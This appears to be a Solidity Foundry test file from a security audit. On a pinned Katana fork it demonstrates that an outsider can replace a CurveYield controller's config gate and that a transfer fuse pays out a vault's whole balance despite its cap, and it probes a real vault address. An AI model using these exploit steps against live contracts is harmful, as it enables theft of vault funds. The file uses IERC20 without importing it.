// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

// Attacker-owned fork regression. Imports unmodified SHA256-admitted production contracts.
import {Test} from "forge-std/Test.sol";
import {FuseAction} from "../../src/interfaces/CurveYieldPhase2Interfaces.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {CurveYieldGateConfig, ICurveYieldConfigGate} from "../../src/governance/CurveYieldGateConfig.sol";
import {CurveYieldAllocationController} from "../../src/allocation/CurveYieldAllocationController.sol";
import {
    CurveYieldErc20TransferFuse,
    CurveYieldErc20TransferFuseEnterData
} from "../../src/generic/CurveYieldErc20TransferFuse.sol";
import {CurveYieldSubstrateLib as Sub} from "../../src/libraries/CurveYieldSubstrateLib.sol";
import {PlasmaVaultConfigLib} from "contracts/libraries/PlasmaVaultConfigLib.sol";

contract AttackerTestGate is ICurveYieldConfigGate {
    uint256 public immutable VALUE;
    constructor(uint256 value_) { VALUE = value_; }
    function getMany(bytes32[] calldata keys) external view override returns (uint256[] memory out) {
        out = new uint256[](keys.length);
        for (uint256 i; i < keys.length; ++i) out[i] = VALUE;
    }
    function addr(bytes32) external pure override returns (address) { return address(0xFEE1); }
    function adminReceiver() external pure override returns (address) { return address(0xFEE1); }
}
contract AttackerTestToken is ERC20 {
    constructor() ERC20("Audit Test", "ATST") {}
    function mint(address who, uint256 amount) external { _mint(who, amount); }
}
contract AttackerFuseExecutionVault {
    CurveYieldErc20TransferFuse public immutable FUSE;
    constructor(CurveYieldErc20TransferFuse fuse_) { FUSE = fuse_; }

    // A test-only stand-in for governance's ordinary substrate grant, in vault storage.
    function grant(address token, address recipient, uint256 cap) external {
        bytes32[] memory subs = new bytes32[](3);
        subs[0] = Sub.encodeAddress(Sub.TRANSFER_TOKEN, token);
        subs[1] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, recipient);
        subs[2] = Sub.encodeCap(token, cap);
        PlasmaVaultConfigLib.grantMarketSubstrates(Sub.CONFIG_MARKET, subs);
    }
    function transferByFuse(address token, address recipient, uint256 requested) external returns (uint256 sent) {
        (bool ok, bytes memory ret) = address(FUSE).delegatecall(abi.encodeWithSelector(
            CurveYieldErc20TransferFuse.enter.selector,
            CurveYieldErc20TransferFuseEnterData(token, recipient, requested)
        ));
        if (!ok) assembly { revert(add(ret, 32), mload(ret)) }
        sent = abi.decode(ret, (uint256));
    }
}
contract AttackerForkConformance_v1 is Test {
    address constant OUTSIDER = address(0xA77AC);
    address constant APPROVED_RECIPIENT = address(0xA1100);
    uint256 constant PINNED_KATANA_BLOCK = 45121798;

    function setUp() public {
        assertEq(block.chainid, 747474, "Use verified Katana fork, never production broadcast");
        assertEq(block.number, PINNED_KATANA_BLOCK, "Fork must be pinned for evidence binding");
    }
    function test_OUTSIDER_canReplaceInheritedGovernanceGate() public {
        AttackerTestGate genuine = new AttackerTestGate(500);
        AttackerTestGate hostile = new AttackerTestGate(9500);
        CurveYieldAllocationController target = new CurveYieldAllocationController(
            address(this), address(0xA11CE), address(0xB00B), address(genuine)
        );
        assertEq(target.vaultFloorBps(), 500, "healthy gate");
        assertEq(target.owner(), address(this), "controller has separate authorized owner");
        vm.prank(OUTSIDER);
        target.setConfigGate(address(hostile));
        assertEq(target.configGate(), address(hostile), "outsider changed active gate");
        assertEq(target.vaultFloorBps(), 9500, "outsider controls live economic config read");
        assertEq(target.owner(), address(this), "ownership did not change");
        emit log_string("CONFIRMED_UNPRIVILEGED_GATE_REPLACEMENT");
        emit log_named_address("outsider", OUTSIDER);
        emit log_named_address("malicious_configGate", target.configGate());
        emit log_named_uint("forged_vault_floor_bps", target.vaultFloorBps());
    }
    function test_OUTSIDER_canBreakConfigReadsViaNoCodeGate() public {
        AttackerTestGate genuine = new AttackerTestGate(200);
        CurveYieldAllocationController target = new CurveYieldAllocationController(
            address(this), address(0xA11CE), address(0xB00B), address(genuine)
        );
        assertEq(target.vaultFloorBps(), 200);
        vm.prank(OUTSIDER);
        target.setConfigGate(address(0xDEAD));
        assertEq(target.configGate(), address(0xDEAD));
        vm.expectRevert();
        target.vaultFloorBps();
        emit log_string("CONFIRMED_OUTSIDER_GATE_SETTER_CAN_CAUSE_VIEW_DOS");
    }
    function test_GRANTED_FUSE_transfersEntireBalanceDespiteSmallCap() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        uint256 inventory = 1_000 ether;
        uint256 requested = 1 ether;
        uint256 cap = 10 ether;
        vault.grant(address(token), APPROVED_RECIPIENT, cap);
        token.mint(address(vault), inventory);
        uint256 sent = vault.transferByFuse(address(token), APPROVED_RECIPIENT, requested);
        assertEq(sent, inventory, "fuse sends full vault balance, not requested amount");
        assertGt(sent, cap, "actual payout bypasses granted per-call cap");
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(APPROVED_RECIPIENT), inventory);
        emit log_string("CONFIRMED_FUSE_BALANCE_OVERPAYMENT");
        emit log_named_uint("requested", requested);
        emit log_named_uint("cap", cap);
        emit log_named_uint("actual_sent", sent);
    }
    function test_GRANTED_FUSE_revertsWhenRequestedExceedsBalance() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        vault.grant(address(token), APPROVED_RECIPIENT, 10 ether);
        token.mint(address(vault), 1 ether);
        vm.expectRevert();
        vault.transferByFuse(address(token), APPROVED_RECIPIENT, 5 ether);
        assertEq(token.balanceOf(address(vault)), 1 ether);
        emit log_string("CONFIRMED_FUSE_UNDERFUNDED_REQUEST_REVERT");
    }
    function test_FUSE_stillEnforcesRecipientSubstrate() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        vault.grant(address(token), APPROVED_RECIPIENT, 10 ether);
        token.mint(address(vault), 100 ether);
        vm.expectRevert();
        vault.transferByFuse(address(token), OUTSIDER, 1 ether);
        assertEq(token.balanceOf(OUTSIDER), 0);
        emit log_string("NEGATIVE_CONTROL_UNGRANTED_RECIPIENT_BLOCKED");
    }
}

interface ILiveVaultExposure {
    function getFuses() external view returns (address[] memory);
    function getMarketSubstrates(uint256 market) external view returns (bytes32[] memory);
    function addFuses(address[] calldata) external;
    function grantMarketSubstrates(uint256, bytes32[] calldata) external;
    function execute(FuseAction[] calldata) external;
    function isFuseSupported(address) external view returns (bool);
}

// Observational actual-vault fork probes. Unlike the five source-exact fixture proofs,
// these establish which guards, grants, balances, and fuse install paths are really present
// at the pinned block. All writes are confined to the disposable Forge fork.
contract AttackerRealVaultExposure_v1 is Test {
    address constant REAL_VAULT = 0xEd83daf48429cfb2C650Fd721b9241e180fd4548;
    address constant REAL_AVKAT = 0x7231dbaCdFc968E07656D12389AB20De82FbfCeB;
    address constant REAL_DEPLOYER = 0x11b78837cadC8E894F1c6e13fA9f3A085a75FA35;
    address constant REAL_SAFE = 0x47623C62f281807D615eeb4A2CEee9d97F9D3C49;
    address constant UNPRIVILEGED = address(0xA77AC);
    uint256 constant BLOCK = 45121798;

    function setUp() public {
        assertEq(block.chainid, 747474, "Katana fork only");
        assertEq(block.number, BLOCK, "Pinned state required");
        assertGt(REAL_VAULT.code.length, 0, "Real vault must exist");
    }

    function test_NATIVE_realVaultInstalledFusesAndGrantsSnapshot() public {
        ILiveVaultExposure vault = ILiveVaultExposure(REAL_VAULT);
        emit log_string("NATIVE_PRESERVED_STATE_SNAPSHOT");
        emit log_named_address("real_vault", REAL_VAULT);
        emit log_named_bytes32("real_vault_codehash", REAL_VAULT.codehash);
        address[] memory installed = vault.getFuses();
        emit log_named_uint("existing_installed_fuses", installed.length);
        for (uint256 i = 0; i < installed.length; ++i) {
            emit log_named_address("existing_installed_fuse", installed[i]);
        }
        bytes32[] memory grants = vault.getMarketSubstrates(Sub.CONFIG_MARKET);
        emit log_named_uint("existing_config_market_substrates", grants.length);
        uint256 tokenGrants;
        uint256 recipientGrants;
        uint256 capGrants;
        for (uint256 i; i < grants.length; ++i) {
            uint256 kind = uint256(grants[i]) >> 248;
            if (kind == Sub.TRANSFER_TOKEN) {tokenGrants++; emit log_named_bytes32("existing_transfer_token", grants[i]);}
            if (kind == Sub.TRANSFER_RECIPIENT) {recipientGrants++; emit log_named_bytes32("existing_transfer_recipient", grants[i]);}
            if (kind == Sub.TRANSFER_CAP) {capGrants++; emit log_named_bytes32("existing_transfer_cap", grants[i]);}
        }
        emit log_named_uint("existing_transfer_token_grants", tokenGrants);
        emit log_named_uint("existing_transfer_recipient_grants", recipientGrants);
        emit log_named_uint("existing_transfer_cap_grants", capGrants);
        emit log_named_uint("real_vault_avkat_balance", IERC20(REAL_AVKAT).balanceOf(REAL_VAULT));
    }

    function test_NATIVE_unprivilegedCannotManageRealVaultFusesAndGrants() public {
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        address[] memory one = new address[](1);
        one[0] = address(fuse);
        vm.prank(UNPRIVILEGED);
        (bool canRegister, bytes memory registerReturn) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.addFuses, (one)));
        emit log_named_string("outsider_register_fuse", canRegister ? "UNEXPECTED_SUCCESS" : "BLOCKED");
        emit log_named_bytes("outsider_register_reason", registerReturn);
        assertFalse(canRegister, "outsider must not install arbitrary fuse");
        bytes32[] memory substr = new bytes32[](1);
        substr[0] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, UNPRIVILEGED);
        vm.prank(UNPRIVILEGED);
        (bool canGrant, bytes memory grantReturn) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.grantMarketSubstrates, (Sub.CONFIG_MARKET, substr)));
        emit log_named_string("outsider_grant_substrate", canGrant ? "UNEXPECTED_SUCCESS" : "BLOCKED");
        emit log_named_bytes("outsider_grant_reason", grantReturn);
        assertFalse(canGrant, "outsider must not set recipient grants");
        emit log_string("NATIVE_OUTSIDER_FUSE_AND_SUBSTRATE_MUTATIONS_BLOCKED");
    }

    function test_NATIVE_authorizedReconfigurationPathAndTransferAccounting() public {
        ILiveVaultExposure vault = ILiveVaultExposure(REAL_VAULT);
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        address[] memory one = new address[](1);
        one[0] = address(fuse);
        vm.prank(REAL_DEPLOYER);
        (bool canRegister, bytes memory registerReturn) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.addFuses, (one)));
        emit log_named_string("authorized_add_source_fuse", canRegister ? "SUCCESS" : "BLOCKED");
        emit log_named_bytes("authorized_add_source_fuse_ret", registerReturn);
        if (!canRegister) {
            emit log_string("NATIVE_RECONFIG_ROUTE_UNAVAILABLE_AT_PINNED_BLOCK");
            return;
        }
        assertTrue(vault.isFuseSupported(address(fuse)), "registered source fuse supported");
        bytes32[] memory original = vault.getMarketSubstrates(Sub.CONFIG_MARKET);
        bytes32[] memory config = new bytes32[](original.length + 3);
        for (uint256 i; i < original.length; ++i) config[i] = original[i];
        config[original.length] = Sub.encodeAddress(Sub.TRANSFER_TOKEN, REAL_AVKAT);
        config[original.length + 1] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, REAL_SAFE);
        config[original.length + 2] = Sub.encodeCap(REAL_AVKAT, 1);
        vm.prank(REAL_DEPLOYER);
        (bool canGrant, bytes memory grantReturn) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.grantMarketSubstrates, (Sub.CONFIG_MARKET, config)));
        emit log_named_string("authorized_grant_source_fuse_config", canGrant ? "SUCCESS" : "BLOCKED");
        emit log_named_bytes("authorized_grant_source_fuse_config_ret", grantReturn);
        if (!canGrant) {
            emit log_string("NATIVE_RECONFIG_GRANT_UNAVAILABLE_AT_PINNED_BLOCK");
            return;
        }
        uint256 balanceBefore = IERC20(REAL_AVKAT).balanceOf(REAL_VAULT);
        uint256 recipientBefore = IERC20(REAL_AVKAT).balanceOf(REAL_SAFE);
        emit log_named_uint("real_vault_avkat_before", balanceBefore);
        if (balanceBefore <= 1) {
            emit log_string("NATIVE_RECONFIG_NO_NONTRIVIAL_LIVE_TOKEN_INVENTORY");
            return;
        }
        FuseAction[] memory calls = new FuseAction[](1);
        calls[0] = FuseAction(address(fuse), abi.encodeCall(
            CurveYieldErc20TransferFuse.enter,
            (CurveYieldErc20TransferFuseEnterData(REAL_AVKAT, REAL_SAFE, 1))
        ));
        vm.prank(REAL_DEPLOYER);
        (bool executed, bytes memory returnOrRevert) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.execute, (calls)));
        emit log_named_string("authorized_real_vault_execute_source_fuse", executed ? "SUCCESS" : "BLOCKED");
        emit log_named_bytes("authorized_execute_ret", returnOrRevert);
        if (!executed) {
            emit log_string("NATIVE_RECONFIG_EXECUTION_BLOCKED_AT_PINNED_BLOCK");
            return;
        }
        uint256 balanceAfter = IERC20(REAL_AVKAT).balanceOf(REAL_VAULT);
        uint256 recipientAfter = IERC20(REAL_AVKAT).balanceOf(REAL_SAFE);
        emit log_named_uint("real_vault_avkat_after", balanceAfter);
        emit log_named_uint("safe_avkat_delta", recipientAfter - recipientBefore);
        emit log_named_uint("requested_and_cap_base_units", 1);
        if (recipientAfter - recipientBefore > 1 && balanceBefore > balanceAfter) {
            emit log_string("NATIVE_AUTHORIZED_RECONFIG_OVERPAYMENT_REPRODUCED_ON_REAL_VAULT_FORK");
            assertEq(recipientAfter - recipientBefore, balanceBefore - balanceAfter);
        } else {
            emit log_string("NATIVE_AUTHORIZED_RECONFIG_NO_OVERPAYMENT_OBSERVED");
        }
    }
}
